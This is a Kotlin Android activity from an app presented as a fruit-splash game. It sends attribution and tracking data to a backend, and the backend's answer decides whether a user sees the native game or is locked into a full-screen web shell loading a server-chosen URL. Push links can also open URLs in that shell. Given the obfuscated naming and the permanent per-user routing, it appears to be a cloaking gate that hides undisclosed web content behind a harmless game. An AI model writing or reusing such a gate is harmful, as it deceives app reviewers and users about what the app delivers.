package com.fruitsplash.fruitsplashgame.zest

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowInsets
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.lifecycle.lifecycleScope
import com.fruitsplash.fruitsplashgame.BuildConfig
import com.fruitsplash.fruitsplashgame.MainActivity
import com.fruitsplash.fruitsplashgame.zest.core.ZestLane
import com.fruitsplash.fruitsplashgame.zest.core.ZestVerdict
import com.fruitsplash.fruitsplashgame.zest.face.ZestLoadView
import com.fruitsplash.fruitsplashgame.zest.lock.ZestHref
import com.fruitsplash.fruitsplashgame.zest.vine.ZestAf
import com.fruitsplash.fruitsplashgame.zest.vine.ZestDrop
import com.fruitsplash.fruitsplashgame.zest.vine.ZestKeep
import com.fruitsplash.fruitsplashgame.zest.vine.ZestPass
import com.fruitsplash.fruitsplashgame.zest.vine.ZestPost
import com.fruitsplash.fruitsplashgame.zest.vine.ZestReach
import com.fruitsplash.fruitsplashgame.zest.core.ZestIds
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull

class ZestGateActivity : ComponentActivity() {

    private lateinit var vault: ZestKeep
    private lateinit var link: ZestReach
    private lateinit var gate: ZestPost
    private lateinit var loadView: ZestLoadView

    private val tracker: ZestAf
        get() = (application as ZestApp).tracker

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hideSystemBars()

        vault = ZestKeep(this)
        link = ZestReach(this)
        gate = ZestPost()
        ZestDrop.ensureChannel(this)

        val lane = vault.readLane()
        val pushUrl = ZestDrop.extractUrl(intent)

        if (pushUrl != null && lane == ZestLane.Web && ZestPass.offer(pushUrl)) {
            info("warm push handed to live shell")
            finish()
            return
        }

        if (lane == ZestLane.Pending && pushUrl == null && !link.hasAnyAdapter()) {
            info("first run offline, still screen first frame")
            startActivity(Intent(this, ZestStillActivity::class.java))
            finish()
            return
        }

        if (pushUrl != null && lane != ZestLane.Native) vault.stashPushLink(pushUrl)

        loadView = ZestLoadView(this)
        setContentView(loadView)
        lifecycleScope.launch { route(lane) }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        val pushUrl = ZestDrop.extractUrl(intent) ?: return
        when (vault.readLane()) {
            ZestLane.Native -> info("push tap while native, game stays")
            ZestLane.Web -> {
                if (ZestPass.offer(pushUrl)) finish()
                else openShell(pushUrl)
            }
            ZestLane.Pending -> vault.stashPushLink(pushUrl)
        }
    }

    private suspend fun route(lane: ZestLane) {
        if (lane == ZestLane.Native) {
            openGame()
            return
        }
        loadView.progress = 0.12f
        if (!awaitConnection(lane)) return
        when (lane) {
            ZestLane.Web -> resolveReturning()
            else -> resolveFirstLaunch()
        }
    }

    private suspend fun awaitConnection(lane: ZestLane): Boolean {
        if (link.hasAnyAdapter()) return true
        val arrived = withTimeoutOrNull(ZestIds.CONNECT_GRACE_MS) {
            link.statusStream().first { it == ZestReach.Status.Online }
        } != null
        if (arrived) return true
        val resume = if (lane == ZestLane.Web && vault.hasUsableLink()) {
            vault.readCachedLink()
        } else {
            null
        }
        startActivity(
            Intent(this, ZestStillActivity::class.java).apply {
                if (!resume.isNullOrEmpty()) putExtra(ZestStillActivity.EXTRA_RESUME_URL, resume)
            },
        )
        finish()
        return false
    }

    private suspend fun resolveFirstLaunch() {
        tracker.ignite(this)
        tracker.retrace(this)
        loadView.progress = 0.38f
        val reply = askBackend(firstLaunch = true)
        loadView.progress = 0.96f
        if (reply.allowed && reply.hasLink) {
            commitWeb(reply)
            loadView.progress = 1f
            openShell(reply.link)
            return
        }
        when {
            !reply.answered -> info("endpoint unreachable, game for now, lane left open")
            !tracker.hasAttributionData() -> info("empty attribution, game for now, lane left open")
            else -> {
                vault.writeLane(ZestLane.Native)
                info("backend ruled native (${reply.note})")
            }
        }
        loadView.progress = 1f
        openGame()
    }

    private suspend fun resolveReturning() {
        val pushed = ZestHref.pick(vault.takePushLink())
        if (pushed != null) {
            openShell(pushed)
            return
        }
        tracker.ignite(this)
        tracker.retrace(this)
        loadView.progress = 0.48f
        val reply = askBackend(firstLaunch = false)
        loadView.progress = 0.96f
        val cached = vault.readCachedLink()
        when {
            reply.allowed && reply.hasLink -> {
                commitWeb(reply)
                loadView.progress = 1f
                openShell(reply.link)
            }
            !cached.isNullOrEmpty() -> {
                loadView.progress = 1f
                openShell(cached)
            }
            else -> {
                startActivity(Intent(this, ZestStillActivity::class.java))
                finish()
            }
        }
    }

    private suspend fun askBackend(firstLaunch: Boolean): ZestVerdict {
        val body = withContext(Dispatchers.IO) {
            tracker.collectBody(firstLaunch).also { gate.decorate(it, this@ZestGateActivity, tracker) }
        }
        loadView.progress = if (firstLaunch) 0.72f else 0.78f
        return gate.query(body)
    }

    private fun commitWeb(reply: ZestVerdict) {
        vault.writeLane(ZestLane.Web)
        reply.link?.let(vault::writeCachedLink)
        vault.writeLinkTtl(reply.ttl ?: 0L)
    }

    private fun openShell(url: String?) {
        val target = ZestHref.pick(url)
        if (target == null) {
            openGame()
            return
        }
        val next = if (vault.shouldOfferInvite(this)) {
            Intent(this, ZestPermitActivity::class.java)
                .putExtra(ZestPermitActivity.EXTRA_TARGET_URL, target)
        } else {
            Intent(this, ZestShellActivity::class.java)
                .putExtra(ZestShellActivity.EXTRA_TARGET_URL, target)
        }
        startActivity(next.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP))
        finish()
    }

    private fun openGame() {
        startActivity(
            Intent(this, MainActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK),
        )
        finish()
    }

    private fun hideSystemBars() {
        if (Build.VERSION.SDK_INT >= 28) {
            window.attributes = window.attributes.apply {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
        window.setDecorFitsSystemWindows(false)
        window.decorView.windowInsetsController?.hide(WindowInsets.Type.systemBars())
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) hideSystemBars()
    }

    private fun info(message: String) {
        if (BuildConfig.DEBUG) Log.i(TAG, message)
    }

    private companion object {
        const val TAG = "ZestGate"
    }
}
